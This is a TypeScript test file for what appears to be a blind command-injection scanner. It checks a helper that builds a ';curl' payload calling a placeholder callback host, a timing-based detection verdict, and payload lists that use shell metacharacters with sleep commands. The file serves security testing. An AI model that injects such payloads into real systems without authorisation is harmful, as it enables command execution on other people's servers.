// blindCmdi.test.ts — pure helpers of the blind_cmdi prover.
import { describe, it, expect } from "vitest";
import { oastPayload, timingVerdict, CMDI_PARAMS, TIME_PAYLOADS, MIN_DELAY_MS } from "./blindCmdi";

describe("oastPayload", () => {
  it("embeds a param-attributed canary label", () => {
    const p = oastPayload("https://oast.test/abc", "p0-file");
    expect(p).toContain("curl https://oast.test/abc/p0-file");
    expect(p.startsWith(";")).toBe(true);
  });
  it("strips trailing slashes from the callback", () => {
    expect(oastPayload("https://oast.test/abc/", "x")).toContain("/abc/x");
  });
});

describe("timingVerdict", () => {
  it("leads when the delay exceeds threshold and jitter", () => {
    const v = timingVerdict(120, 135, 6250);
    expect(v.lead).toBe(true);
    expect(v.detail).toContain("6");
  });

  it("stays silent on sub-threshold deltas (server is just slow)", () => {
    const v = timingVerdict(1800, 1850, 2200);
    expect(v.lead).toBe(false);
  });

  it("stays silent when jitter explains the delta", () => {
    const v = timingVerdict(400, 3000, 4000);
    expect(v.lead).toBe(false);
  });

  it("exposes the threshold constant", () => {
    expect(MIN_DELAY_MS).toBe(5_000);
  });
});

describe("payload batteries", () => {
  it("cover the main shell metacharacters", () => {
    const joined = TIME_PAYLOADS.map((t) => t.p).join(" ");
    for (const ch of [";", "|", "`", "$("]) expect(joined).toContain(ch);
    expect(TIME_PAYLOADS.every((t) => /sleep|timeout/.test(t.p))).toBe(true);
  });
  it("param list is file/host-shaped and deduped", () => {
    expect(new Set(CMDI_PARAMS).size).toBe(CMDI_PARAMS.length);
    expect(CMDI_PARAMS).toContain("host");
    expect(CMDI_PARAMS).toContain("file");
  });
});
